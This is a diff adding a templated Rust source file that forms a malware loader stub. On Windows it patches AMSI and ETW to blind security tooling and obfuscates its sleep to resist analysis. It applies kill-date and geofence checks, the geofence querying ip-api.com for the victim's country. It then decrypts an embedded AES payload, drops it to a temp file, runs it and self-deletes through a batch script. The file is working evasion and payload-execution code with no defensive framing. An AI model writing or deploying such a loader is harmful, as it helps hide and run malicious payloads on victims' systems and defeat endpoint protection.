@@ -1,0 +1,133 @@
+use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
+use base64::{engine::general_purpose, Engine as _};
+use std::env;
+use std::fs;
+use std::process::Command;
+#[cfg(unix)]
+use std::os::unix::fs::PermissionsExt;
+use std::time::{SystemTime, UNIX_EPOCH};
+use std::net::TcpStream;
+use std::io::{Read, Write};
+
+{% if derive_key %}
+use sha2::{Sha256, Digest};
+{% endif %}
+
+type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
+
+#[cfg(target_os = "windows")]
+mod stealth;
+
+fn main() -> Result<(), String> {
+    // Phase 2: Stealth Preflight
+    #[cfg(target_os = "windows")]
+    {
+        // AMSI & ETW Patching
+        stealth::stealth::preflight_patch();
+        
+        // Sleep Obfuscation (Foliage)
+        {% if anti_analysis %}
+        stealth::stealth::sleep_obfuscate(5000); // 5 seconds sleep
+        {% endif %}
+    }
+
+    // Guardrails
+    {% if kill_date %}
+    let start = SystemTime::now();
+    let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
+    // kill_date_ts is passed from engine
+    if since_the_epoch.as_secs() > {{ kill_date_ts }} {
+        return Ok(());
+    }
+    {% endif %}
+
+    {% if geofence %}
+    // Geofence check using TcpStream to ip-api.com
+    if let Ok(mut stream) = TcpStream::connect("ip-api.com:80") {
+        let req = "GET /line/?fields=countryCode HTTP/1.0\r\nHost: ip-api.com\r\n\r\n";
+        let _ = stream.write_all(req.as_bytes());
+        let mut resp = String::new();
+        let _ = stream.read_to_string(&mut resp);
+        if let Some(body_start) = resp.find("\r\n\r\n") {
+            let body = &resp[body_start+4..];
+            if !body.trim().starts_with("{{ geofence }}") {
+                return Ok(());
+            }
+        }
+    }
+    {% endif %}
+
+    // These values are injected by the template engine
+    let b64_ciphertext = "{{ ciphertext }}";
+    let b64_iv = "{{ iv }}";
+
+    // Decode Base64
+    let iv = general_purpose::STANDARD.decode(b64_iv).map_err(|e| e.to_string())?;
+    let mut ciphertext = general_purpose::STANDARD.decode(b64_ciphertext).map_err(|e| e.to_string())?;
+
+    {% if derive_key %}
+    // Derive key from environment variable
+    let env_val = env::var("{{ guardrail }}").map_err(|_| "Environment key missing".to_string())?;
+    let mut hasher = Sha256::new();
+    hasher.update(env_val.as_bytes());
+    let key = hasher.finalize();
+    {% else %}
+    // Use hardcoded key
+    let b64_key = "{{ key }}";
+    let key = general_purpose::STANDARD.decode(b64_key).map_err(|e| e.to_string())?;
+    {% endif %}
+
+    // Decrypt
+    let dec = Aes256CbcDec::new_from_slices(&key, &iv).map_err(|_| "Invalid Key/IV Length".to_string())?;
+    let plaintext = dec.decrypt_padded_mut::<Pkcs7>(&mut ciphertext).map_err(|e| e.to_string())?;
+
+    // Write to temp file
+    let mut temp_path = env::temp_dir();
+    temp_path.push("payload.exe"); 
+    if cfg!(unix) {
+        temp_path.set_extension("bin");
+    }
+
+    fs::write(&temp_path, plaintext).map_err(|e| e.to_string())?;
+
+    // Set executable permission on Unix
+    #[cfg(unix)]
+    {
+        if let Ok(metadata) = fs::metadata(&temp_path) {
+            let mut perms = metadata.permissions();
+            perms.set_mode(0o755);
+            let _ = fs::set_permissions(&temp_path, perms);
+        }
+    }
+
+    // Execute
+    let status = Command::new(&temp_path).status().map_err(|e| e.to_string())?;
+
+    // Cleanup
+    let _ = fs::remove_file(&temp_path);
+
+    if !status.success() {
+        return Err("Execution failed".to_string());
+    }
+
+    // Melt / Self-Delete
+    {% if melt_script %}
+    #[cfg(target_os = "windows")]
+    {
+        let mut batch_path = env::temp_dir();
+        batch_path.push("cleanup.bat");
+        let script = r#"{{ melt_script }}"#;
+        if fs::write(&batch_path, script).is_ok() {
+             if let Ok(current_exe) = env::current_exe() {
+                 let _ = Command::new("cmd")
+                     .arg("/c")
+                     .arg(&batch_path)
+                     .arg(current_exe)
+                     .spawn();
+             }
+        }
+    }
+    {% endif %}
+
+    Ok(())
+}
